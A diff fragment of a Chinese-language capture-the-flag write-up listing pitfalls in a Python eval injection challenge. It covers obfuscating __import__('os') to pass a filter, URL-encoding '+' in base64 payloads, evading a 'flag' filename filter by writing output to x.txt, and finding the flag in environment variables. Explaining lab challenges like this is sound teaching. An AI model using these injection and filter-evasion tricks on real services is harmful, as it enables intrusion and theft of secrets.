-<p>那是<strong>函数调用</strong>不是取下标，必须写 <code>__import__('o'+'s')</code>。写成方括号，eval 直接抛 TypeError，而 <code>/calc</code> 失败时页面没反馈，很难察觉。</p>
-<p><strong>② base64 的 <code>+</code> 没编码</strong></p>
-<p>query 里的 <code>+</code> → 空格 → base64 解码失败。<strong>表现是“页面没反应”，不是报错。</strong>这是这题最容易卡住的地方。</p>
-<p><strong>③ 想直接 <code>/readFile?filename=/flag</code></strong></p>
-<p>源码里 <code>filename.replace("flag", "?????")</code>——<strong>连路径里的 flag 都会被替换</strong>。所以必须先把内容写到另一个名字的文件里（<code>x.txt</code>），再读那个文件。</p>
-<p><strong>④ 只在根目录找 flag</strong></p>
-<p><code>cat /f*</code> 出来 <code>flagnothere</code>、<code>ls /</code> 只有一个 <code>flag.sh</code>。<strong>真 flag 在环境变量里（<code>env</code>）。</strong></p>
 </details>
     
     
